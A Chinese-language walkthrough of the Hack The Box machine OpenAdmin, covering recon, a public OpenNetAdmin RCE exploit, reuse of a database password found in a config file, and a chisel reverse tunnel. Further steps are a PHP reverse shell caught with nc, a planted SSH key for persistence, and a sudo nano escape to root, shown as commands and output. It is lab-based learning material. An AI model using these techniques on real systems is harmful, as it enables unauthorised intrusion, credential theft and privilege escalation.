# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务探测
查看开启端口
```
┌──(root💀kali)-[~/htb/OpenAdmin]
└─# nmap -p- 10.10.10.171 --open               
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-23 07:25 EST
Nmap scan report for 10.10.10.171
Host is up (0.44s latency).
Not shown: 52367 closed ports, 13166 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 190.21 seconds

```

查看指定端口详细信息
```
(root💀kali)-[~/htb/OpenAdmin]
└─# nmap -sV -T4 -sC -A -O 10.10.10.171 -p 22,80
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-23 07:29 EST
Nmap scan report for 10.10.10.171
Host is up (0.37s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (98%), Linux 3.2 (98%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (98%), Linux 3.16 (97%), ASUS RT-N56U WAP (Linux 3.4) (96%), Asus RT-N10 router or AXIS 211A Network Camera (Linux 2.6) (94%), Linux 2.6.18 (94%), AXIS 211A Network Camera (Linux 2.6.20) (94%), Linux 2.6.16 (94%), Asus RT-AC66U router (Linux 2.6) (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   432.42 ms 10.10.14.1
2   440.73 ms 10.10.10.171

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.54 seconds

```

## 目录爆破
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.10.171 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.10.171/_21-12-23_07-30-54.txt

Error Log: /root/dirsearch/logs/errors-21-12-23_07-30-54.log

Target: http://10.10.10.171/

[07:31:03] Starting:   
[07:33:49] 200 -   11KB - /index.html                                       
[07:34:05] 301 -  312B  - /music  ->  http://10.10.10.171/music/             
[07:34:08] 301 -  310B  - /ona  ->  http://10.10.10.171/ona/                    
```

```/ona/```文件夹是一个叫```openNetAdmin```的cms，版本号是```18.1.1```

## webshell

kali搜索这个cms的漏洞情况
```
┌──(root💀kali)-[~/htb/OpenAdmin]
└─# searchsploit openNetAdmin 18.1.1
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                                                                                                                     | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                                                                                                                                      | php/webapps/47691.sh
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

存在一个rce漏洞，但是自带的这个exp不太好用

在github上找到了[这个exp](https://github.com/amriunix/ona-rce)


拿到webshell
```
┌──(root💀kali)-[~/htb/OpenAdmin]
└─# python3 ona-rce.py exploit http://10.10.10.171/ona/
[*] OpenNetAdmin 18.1.1 - Remote Code Execution
[+] Connecting !
[+] Connected Successfully!
sh$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```


# 提权
查看本目录下```config/config.inc.php```文件，其中有两行

```
// Include the localized Database settings
$dbconffile = "{$base}/local/config/database_settings.inc.php";
```

表示包含了一个数据库连接文件

全局搜索这个文件

> find / -name database_settings.inc.php 2>/dev/null

定位文件路径为

```
/opt/ona/www/local/config/database_settings.inc.php

```

查看文件内容
```
sh$ cat /opt/ona/www/local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

```

得到一个数据库密码：```n1nj4W4rri0R!```。从```/etc/passwd```可知有两个bash用户```jimmy```和```joanna```

## 提权到jimmy

逐一尝试ssh登录，成功登陆到jimmy

```
┌──(root💀kali)-[~/htb/OpenAdmin]
└─# ssh jimmy@10.10.10.171        
The authenticity of host '10.10.10.171 (10.10.10.171)' can't be established.
RSA key fingerprint is SHA256:0RZ0tIo79V3XctDFJP5dC6s9XskBzxmyXLwOWgnOQEo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.171' (RSA) to the list of known hosts.
jimmy@10.10.10.171's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Dec 23 12:59:42 UTC 2021

  System load:  0.01              Processes:             175
  Usage of /:   30.9% of 7.81GB   Users logged in:       0
  Memory usage: 10%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.


Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
jimmy@openadmin:~$ 

```

没有权限进入joanna的文件夹，相信user.txt在joanna的home目录下


查看网络连接

```
jimmy@openadmin:/tmp$ netstat -ano|grep LISTEN
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)

```

留意有几个网络连接只监听了本地，3306是数据库，53是dns，这些都算正常。唯独52846这个端口很陌生，因此非常可疑。

## 隧道连接

把```chisel```传到靶机

kali端：
> ./chisel server -p 8000 --reverse

靶机端：
> ./chisel client 10.10.14.3:8000 R:52846:localhost:52846


本地已经可以监听到这个端口
```
┌──(root💀kali)-[~/htb/OpenAdmin]
└─# netstat -nao|grep 52846                    
tcp6       0      0 :::52846                :::*                    LISTEN      off (0.00/0/0)
```

用nmap扫描一下这个端口的信息，发现是一个http服务
```
┌──(root💀kali)-[~/htb/OpenAdmin]
└─# nmap -sV -T4 127.0.0.1 -p 52846        
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-23 08:48 EST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00021s latency).

PORT      STATE SERVICE VERSION
52846/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.19 seconds

```

打开```http://localhost:52846/index.php```是一个登陆页面，我们不知道密码和用户名

回到靶机，查看apache的一个配置文件

```
jimmy@openadmin:~$ cat /etc/apache2/sites-enabled/internal.conf 
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

```

可以看到这个服务正是用户```joanna```开启

去到```/var/www/internal```

查看index.php,留意这几行代码，可以看到用户名是```jimmy```，密码用sha512加密了


```
 if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }

```

把哈希密码拿到啊[这个网站](https://www.somd5.com/)解密，得到：```Revealed```

现在用```jimmy : Revealed ```登录```http://localhost:52846/index.php```

拿到了```joanna```的ssh秘钥
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
```

底下还有一行字：
> Don't forget your "ninja" password

使用上门的私钥，ssh无法登录，提示需要密码，用john无法爆破，可能是一个兔子洞。。

此时留意到```main.php```是可编辑的，而且执行了一个系统函数```shell_exec```

尝试修改一行代码
```
$output = shell_exec('id');

```

页面成功打印:
> uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)

这样就非常简单，我们使用以下payload，拿到一个反弹shell

## 横向提权到joanna
这里我试了好多payload都不能反弹shell，最好只好在github上找到这个php的[reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

拿到joanna的shell

```
┌──(root💀kali)-[~/htb/OpenAdmin]
└─# nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.171] 41636
id
Linux openadmin 4.15.0-70-generic #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 15:37:07 up  3:14,  2 users,  load average: 0.01, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
jimmy    pts/1    10.10.14.3       14:37   14.00s  0.12s  0.12s -bash
jimmy    pts/2    10.10.14.3       13:34    1:50m  8.44s  8.38s ./chisel client 10.10.14.3:8000 R:52846:localhost:52846
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
/bin/sh: 0: can't access tty; job control turned off
$ uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
$ whoami
joanna

```


切换tty后，查看sudo特权，发现无法正常查看
```
joanna@openadmin:/$ sudo -l
sudo -l
sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
sudo: error initializing audit plugin sudoers_audit

```

传linpea到靶机发现有一个sudo特权的文件在```/etc/sudoers.d/joanna```

查看这个文件：
```
joanna@openadmin:/$ cat /etc/sudoers.d/joanna
cat /etc/sudoers.d/joanna
joanna ALL=(ALL) NOPASSWD:/bin/nano /opt/priv

```

日。。。


查了一下，因为我们是从web的反弹shell进到系统的，在apache的这个文件里```/etc/apache2/sites-enabled/internal.conf ```禁用了sudo
```
<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>
```

因此我们一直提示错误。

## ssh

只好转变思路。

由于我们现在已经是joanna的身份，可以编辑```.ssh```里的文件，把kali的id_rsa.public加入到joanna的authorized_keys，就可以无密码登录joanna
这样就可以跳过apache对sudo的限制

把id_rsa.public追加到authorized_keys
```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXMYce9FPGn7FNt1MeNFTb2iTy917/1tzSKdRWnV4u2FmMUT85u92xUwpudizoAn10Bb7Y9r4813I3KjTzYO2OlJSCqQ4+PB+VI9/0dE67sInXsQJfdnXfguuA+oVzEU1QPCqCVuSt4pQaiXCeo0GmTiVZyVBNaJJoZCtNipqL/zyO5Avb6yfnxSYDusIPDuUWnJNBI9tE48MBDW0zDYdEajCddu2AjusHNNlS9nxgOqKulpsLM54/c2X5ttDp+DdYuQikc2Ju9MIDQE0og+W6QrtCF3FmKXMZxkU5OFTOmtfdg2U3OPoU1GKFOLks0tgglco9oDuO5qYHuD4/v7nRUtlTweCAOXDvGOItAB58uw2J8wINs6k/UrCL0or/tJ33vaoDFSI47WjRWNwEGNY+ESRjK1sbQFOdFGG2F4TvhWWv+mEEEKWtXlwBHYokIwRUzNy/s1cuMboUl6IqnorlCnLxazjx4/1VBm4Cu8j0cfa6VuzyiL+khSoz4RPG9Lc= root@kali" >> authorized_keys

```

ssh登录到joanna
```
┌──(root💀kali)-[~]
└─# ssh joanna@10.10.10.171                                                                                                                                                                                    1 ⨯
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Dec 23 16:45:11 UTC 2021

  System load:  0.0               Processes:             204
  Usage of /:   31.1% of 7.81GB   Users logged in:       2
  Memory usage: 16%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Dec 23 16:34:27 2021 from 10.10.14.3
joanna@openadmin:~$ id
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
```

现在我们已经是ssh登录进来，不受apache配置限制，查看sudo特权
```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv

```

## 提权到root

执行：
> sudo /bin/nano /opt/priv

进入nano编辑页面以后依次执行以下两行命令：
```
^R^X
reset; sh 1>&0 2>&0
```

成功提权到root
```
Command to execute: reset; sh 1>&0 2>&0#                                                                                                                                                                           
#  Get Help                                                                                              ^X Read File
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# cat /root/root.txt
{不告诉你}
```

# 总结
总的来说还是简单的靶机，就是比较绕，有几次提权，要保持耐心。